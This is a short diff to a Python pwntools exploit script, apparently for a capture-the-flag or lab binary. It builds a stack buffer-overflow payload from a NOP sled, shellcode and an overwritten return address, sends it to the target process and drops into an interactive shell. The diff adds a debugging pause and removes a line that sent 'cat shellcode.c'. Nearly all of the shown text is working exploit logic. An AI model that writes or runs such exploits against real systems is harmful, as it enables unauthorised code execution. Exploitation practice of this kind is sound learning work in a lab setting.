@@ -14,6 +14,8 @@ pwn.gdb.attach(r, """c
 """)
 '''
 
+input()
+
 buf = r.recvuntil('name?\n')
 
 print(buf)
@@ -26,9 +28,5 @@ nop_sled = b'\x90' * (offset - len(shell_code))
 exploit = nop_sled + shell_code + pwn.p64(buffer_addr)
 
 r.send(exploit)
-
-r.send("cat shellcode.c")
-
-r.recvall()
 
 r.interactive()
